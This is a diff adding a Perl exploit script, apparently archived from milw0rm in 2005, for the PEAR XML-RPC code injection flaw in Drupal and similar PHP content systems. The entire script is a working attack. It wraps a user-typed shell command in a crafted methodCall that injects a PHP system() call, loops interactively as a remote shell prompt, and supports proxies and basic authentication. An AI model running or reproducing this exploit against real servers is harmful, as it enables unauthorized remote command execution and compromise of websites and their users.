@@ -1,0 +1,119 @@
+# tested and working /str0ke
+
+#!/usr/bin/perl
+# 
+#  ilo-- 
+#
+#  This program is no GPL or has nothing to do with FSF, but some
+#  code was ripped from romansoft.. sorry, too lazy!
+#  
+#  xmlrpc bug by James from GulfTech Security Research. 
+#  http://pear.php.net/bugs/bug.php?id=4692
+#  xmlrpc drupal exploit, but James sais xoops, phpnuke and other
+#  cms should be vulnerable.
+#
+#  greets: dsr! digitalsec.net
+#
+require LWP::UserAgent;
+use URI;
+use Getopt::Long;
+use strict;
+$| = 1;  # fflush stdout after print
+
+# Default options
+# connection 
+my $basic_auth_user = '';
+my $basic_auth_pass = '';
+my $proxy = '';
+my $proxy_user = '';
+my $proxy_pass = '';
+my $conn_timeout = 15;
+
+# general
+my $host;
+ 
+ #informational lines to feed my own ego.
+ print "xmlrpc exploit - http://www.reversing.org \n";
+ print "2005 ilo-- <ilo".chr(64)."reversing.org> \n";
+ print "special chars allowed are / and - \n\n";
+
+ # read command line options
+ my $options = GetOptions (
+
+ #general options
+ 'host=s'    => \$host, # input host to test.
+
+ # connection options
+ 'basic_auth_user=s' => \$basic_auth_user,
+ 'basic_auth_pass=s' => \$basic_auth_pass,
+ 'proxy=s'           => \$proxy,
+ 'proxy_user=s'      => \$proxy_user,
+ 'proxy_pass=s'      => \$proxy_pass,
+ 'timeout=i'         => \$conn_timeout);
+
+ # command line sanity check 
+ &show_usage unless ($host);
+
+ # main loop 
+ while (1){
+ 	print "\nxmlrpc@# ";
+ 	my $cmd = <STDIN>;
+ 	xmlrpc_xploit ($cmd);
+ }
+
+ exit (1);
+
+#exploit 
+sub xmlrpc_xploit {
+chomp (my $data = shift);
+my $reply;
+
+my $d1 = "<?xml version=\"1.0\"?><methodCall><methodName>examples.getStateName</methodName><params><param><name>a');";  
+my $d2 = ";//</name><value>xml exploit R/01</value></param></params></methodCall>";
+
+  $data =~ s/-/'.chr(45).'/mg;
+  $data =~ s/\//'.char(47).'/mg;
+
+  my $req = new HTTP::Request 'POST' => $host;
+  $req->content_type('application/xml');
+  $req->content($d1.'system(\''.$data.'\')'.$d2);
+  
+  my $ua = new LWP::UserAgent;
+  $ua->agent("xmlrpc exploit R/0.1");
+  $ua->timeout($conn_timeout);
+
+  if ($basic_auth_user){
+    $req->authorization_basic($basic_auth_user, $basic_auth_pass) 
+  }
+  if ($proxy){
+    $ua->proxy(['http'] => $proxy);
+    $req->proxy_authorization_basic($proxy_user, $proxy_pass);
+  }
+ 
+  #send request, return null if not OK
+  my $res = $ua->request($req);
+  if ($res->is_success){
+     $reply= $res->content;
+  } else { 
+     $reply = "";
+  }
+  $reply =~ /(.*).(<pre>warning.*)/mgsi;
+  print ($1);
+}
+
+# show options 
+sub show_usage {
+  print "Syntax: ./xmlrpc.pl [options] host/uri\n\n";
+  print "main options\n";
+  print "connection options\n";
+  print "\t--proxy (http), --proxy_user, --proxy_pass\n";
+  print "\t--basic_auth_user, --basic_auth_pass\n";
+  print "\t--timeout \n";
+  print "\nExample\n";
+  print "bash# xmlrpc.pl --host=http://www.host.com/xmlrpc.php \n";
+  print "\n";
+  exit(1);
+}
+
+
+# milw0rm.com [2005-07-01]
